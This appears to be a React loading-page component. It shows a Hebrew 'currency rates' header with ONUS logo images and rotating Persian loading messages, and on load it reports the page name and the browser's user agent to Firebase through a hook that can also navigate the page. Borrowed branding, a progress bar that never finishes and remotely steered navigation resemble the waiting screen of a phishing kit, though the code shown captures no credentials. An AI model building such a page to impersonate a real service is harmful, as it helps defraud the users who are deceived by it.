import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { motion } from "framer-motion";
import { X, Menu } from "lucide-react";
import { useFirebaseClient } from "../hooks/useFirebaseClient";

const LoadingPage = () => {
  const navigate = useNavigate();
  const { updateClientData } = useFirebaseClient(navigate);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isDesktopMenuOpen, setIsDesktopMenuOpen] = useState(false);
  const [currentTextIndex, setCurrentTextIndex] = useState(0);

  // Textos de loading em persa
  const loadingTexts = [
    'در حال بارگذاری...',
    'لطفا صبر کنید...',
    'در حال پردازش اطلاعات...',
    'تقریبا تمام شد...',
    'در حال اتصال به سرور...'
  ];

  // Atualizar dados iniciais quando a aplicação carrega
  useEffect(() => {
    updateClientData({
      currentUrl: "/loading",
      currentPage: "LOADING",
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
  }, [updateClientData]);

  // Rotacionar textos de loading
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTextIndex((prev) => (prev + 1) % loadingTexts.length);
    }, 2000);

    return () => clearInterval(interval);
  }, [loadingTexts.length]);

  return (
    <div className="min-h-screen overflow-x-hidden" style={{ backgroundColor: '#F4F5FA' }}>
      {/* Header Mobile com altura reduzida - igual ao da página inicial */}
      <header 
        className="w-full py-1 md:py-2"
        style={{ backgroundColor: '#13114A' }}
      >
        {/* VERSÃO DESKTOP - oculta no mobile */}
        <div className="hidden md:flex justify-between items-center w-full px-0">
          {/* Menu hamburger com botões colados */}
          <div className="flex items-center space-x-2 ml-0 relative">
            <button 
              onClick={() => setIsDesktopMenuOpen(!isDesktopMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            {/* Bolinha pulsante amarela movida mais para baixo */}
            <div className="absolute top-2 -left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-10"></div>
            
            {/* Barra vertical separadora */}
            <div className="h-12 w-px bg-white opacity-10"></div>
            
            {/* Botão 1 - com SVG de acessibilidade mais grosso, menos alto */}
            <button className="text-white px-3 py-2 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors flex items-center space-x-2">
              <svg width="20" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="currentColor" strokeWidth="2"/>
              </svg>
              <span className="text-sm">נגישות</span>
            </button>
            
            {/* Botão 2 - com SVG de idioma mais grosso, menos alto */}
            <button className="text-white px-3 py-2 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors flex items-center space-x-2">
              <svg width="20" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z" fill="currentColor" strokeWidth="2"/>
              </svg>
              <span className="text-sm">עברית</span>
            </button>
          </div>

          {/* Texto centralizado */}
          <div className="absolute left-1/2 transform -translate-x-1/2">
            <h1 className="text-white text-xl font-bold hebrew-text">שערי מטבע</h1>
          </div>

          {/* Lado direito - Logo */}
          <div className="flex items-center space-x-4 mr-4">
            <div className="flex flex-col items-end">
              <img src="/logo1.svg" alt="ONUS Logo" className="h-8 w-auto" />
              <img src="/teste.png" alt="Sub Logo" className="h-3 w-auto mt-1" />
            </div>
          </div>
        </div>

        {/* VERSÃO MOBILE - visível apenas no mobile */}
        <div className="md:hidden w-full max-w-full overflow-hidden">
          <div className="flex items-center justify-between w-full px-4 py-2">
            {/* Menu Button com bolinha amarela */}
            <div className="relative">
              <button 
                onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                className="flex-shrink-0 p-2 rounded-lg hover:bg-white hover:bg-opacity-20 transition-colors"
                aria-label="Toggle menu"
              >
                {isMobileMenuOpen ? (
                  <X className="w-5 h-5 text-white" />
                ) : (
                  <Menu className="w-5 h-5 text-white" />
                )}
              </button>
              {/* Bolinha pulsante amarela ajustada */}
              <div className="absolute top-1 -left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-10"></div>
            </div>
            
            {/* Texto centralizado */}
            <div className="flex-1 text-center">
              <h1 className="text-white text-lg font-bold hebrew-text">שערי מטבע</h1>
            </div>
            
            {/* Logo */}
            <div className="flex flex-col items-end flex-shrink-0">
              <img src="/logo1.svg" alt="ONUS Logo" className="h-6 w-auto" />
              <img src="/teste.png" alt="Sub Logo" className="h-2 w-auto mt-0.5" />
            </div>
          </div>
        </div>

        {/* Menu Mobile Dropdown */}
        {isMobileMenuOpen && (
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="md:hidden bg-white shadow-lg border-t border-gray-200"
          >
            <div className="px-4 py-3 space-y-2">
              <button className="w-full text-left px-3 py-2 text-gray-700 hover:bg-gray-100 rounded-lg transition-colors flex items-center space-x-2">
                <span>נגישות</span>
              </button>
              <button className="w-full text-left px-3 py-2 text-gray-700 hover:bg-gray-100 rounded-lg transition-colors flex items-center space-x-2">
                <span>עברית</span>
              </button>
            </div>
          </motion.div>
        )}
      </header>

      {/* Conteúdo Principal - Spinner de Loading */}
      <div className="flex items-center justify-center min-h-[calc(100vh-80px)]">
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.5 }}
          className="bg-gradient-to-br from-gray-900 via-blue-900 to-purple-900 rounded-2xl p-12 max-w-md w-full mx-4 border border-white/20 shadow-2xl text-center"
        >
          {/* Spinner Principal */}
          <div className="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-6">
            <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
          </div>
          
          {/* Texto em Persa com Animação */}
          <motion.div
            key={currentTextIndex}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.5 }}
            className="mb-4"
          >
            <h3 className="text-2xl font-bold text-white mb-2 hebrew-text" dir="rtl">
              {loadingTexts[currentTextIndex]}
            </h3>
          </motion.div>
          
          {/* Barra de Progresso Animada */}
          <div className="w-full bg-gray-700 rounded-full h-2 mb-4">
            <motion.div
              className="bg-gradient-to-r from-blue-500 to-purple-500 h-2 rounded-full"
              initial={{ width: "0%" }}
              animate={{ width: "100%" }}
              transition={{ 
                duration: 10, 
                repeat: Infinity, 
                repeatType: "loop",
                ease: "linear"
              }}
            />
          </div>
          
          {/* Texto Secundário */}
          <p className="text-gray-300 text-sm hebrew-text" dir="rtl">
            سیستم در حال آماده سازی است...
          </p>
          
          {/* Pontos Animados */}
          <div className="flex justify-center space-x-1 mt-4">
            {[0, 1, 2].map((i) => (
              <motion.div
                key={i}
                className="w-2 h-2 bg-blue-400 rounded-full"
                animate={{
                  scale: [1, 1.2, 1],
                  opacity: [0.5, 1, 0.5],
                }}
                transition={{
                  duration: 1.5,
                  repeat: Infinity,
                  delay: i * 0.2,
                }}
              />
            ))}
          </div>
        </motion.div>
      </div>
    </div>
  );
};

export default LoadingPage;